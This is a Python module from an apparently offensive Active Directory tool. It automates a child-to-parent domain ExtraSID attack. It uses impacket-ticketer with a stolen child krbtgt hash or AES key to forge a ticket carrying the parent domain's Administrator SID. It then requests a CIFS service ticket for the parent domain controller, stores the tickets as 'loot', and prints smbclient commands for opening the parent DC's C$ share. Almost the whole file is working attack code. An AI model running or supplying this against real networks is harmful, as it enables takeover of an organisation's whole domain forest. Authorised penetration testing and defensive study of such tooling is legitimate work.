# modules/extrasid.py

import os
import subprocess
import re
import shutil
from core.colors import red, green, yellow, blue
from core.helpers import save_loot
from rich import print

def is_valid_sid(sid):
    return bool(re.match(r"^S-\\d-\\d+(-\\d+){1,}$", sid))

def run(session):
    print(blue("[*] Starting ExtraSID privilege escalation (child → parent)..."))

    child_domain = session.domain
    dc_ip = session.dc_ip
    username = session.username

    print(blue(f"[*] Session: {username}@{child_domain}"))

    parent_domain = input("[?] Enter parent domain (e.g., finance.corp): ").strip()
    parent_dc_fqdn = input("[?] Enter FQDN of the parent DC (e.g., dc01.finance.corp): ").strip()
    child_sid = input("[?] Enter Child Domain SID: ").strip()
    parent_sid = input("[?] Enter Parent Domain SID: ").strip()

    if not all([is_valid_sid(child_sid), is_valid_sid(parent_sid)]):
        print(red("[-] Invalid SID format(s)."))
        return

    if "." not in parent_domain or "." not in parent_dc_fqdn:
        print(red("[-] Invalid domain or DC FQDN format."))
        return

    print(blue("[*] Choose key type for krbtgt of child domain:"))
    print("  1) NT hash (RC4)")
    print("  2) AES256 key")
    key_choice = input("[?] Key type (1/2): ").strip()

    if key_choice == "1":
        key_flag = "-nthash"
        key_value = input("[?] Enter NT hash (32 hex chars): ").strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", key_value):
            print(red("[-] NT hash must be 32 hex characters."))
            return
    elif key_choice == "2":
        key_flag = "-aesKey"
        key_value = input("[?] Enter AES256 key (64 hex chars): ").strip()
        if not re.fullmatch(r"[0-9a-fA-F]{64}", key_value):
            print(red("[-] AES256 key must be 64 hex characters."))
            return
    else:
        print(red("[-] Invalid key type selection."))
        return

    if not shutil.which("impacket-ticketer") or not shutil.which("impacket-getST"):
        print(red("[-] Required tools not found: impacket-ticketer / getST"))
        return

    tgt_path = f"loot/{username}_extratgt.ccache"
    tgt_base = tgt_path.replace(".ccache", "")

    # === Step 1: Forge TGT with ExtraSID
    tgt_cmd = [
        "impacket-ticketer",
        "-domain", child_domain,
        key_flag, key_value,
        "-domain-sid", child_sid,
        "-user-id", "500",
        "-groups", "512",
        "-extra-sid", f"{parent_sid}-500",
        username
    ]

    print(blue("[*] Creating TGT with ExtraSID..."))
    try:
        subprocess.run(tgt_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(red(f"[-] TGT creation failed:\n{e}"))
        return

    default_ccache = f"{username}.ccache"
    if os.path.exists(default_ccache):
        shutil.move(default_ccache, tgt_path)
        print(green(f"[+] TGT saved to loot: {tgt_path}"))
    else:
        print(red(f"[-] TGT file {default_ccache} was not created."))
        return

    # === Step 2: Request ST for CIFS SPN
    spn = f"CIFS/{parent_dc_fqdn}"
    getst_cmd = [
        "impacket-getST",
        "-spn", spn,
        "-k", "-no-pass",
        f"{child_domain}/{username}",
        "-debug"
    ]

    print(blue(f"[*] Requesting ST for SPN: {spn}"))
    try:
        subprocess.run(getst_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(red(f"[-] Service ticket request failed:\n{e}"))
        return

    # === Step 3: Save ST
    st_name = f"{username}@{spn.replace('/', '_')}@{parent_domain.upper()}.ccache"
    st_path = f"loot/{st_name}"
    if os.path.exists(st_name):
        shutil.move(st_name, st_path)
        print(green(f"[+] ST saved to loot: {st_path}"))
    else:
        print(yellow("[!] ST file not found. You may need to locate it manually."))

    # === Final Instructions
    print()
    print(green("[+] ExtraSID attack completed successfully."))
    print(yellow("[*] Run the following commands manually to access the parent domain:\n"))
    print(yellow(f"export KRB5CCNAME='{os.path.abspath(st_path)}'"))
    print(yellow(f"smbclient.py -k -no-pass //{parent_dc_fqdn}/C$"))
    print()

    save_loot("extrasid.log", f"Child SID: {child_sid}\nParent SID: {parent_sid}\nSPN: {spn}\nTGT: {tgt_path}\nST: {st_path}")

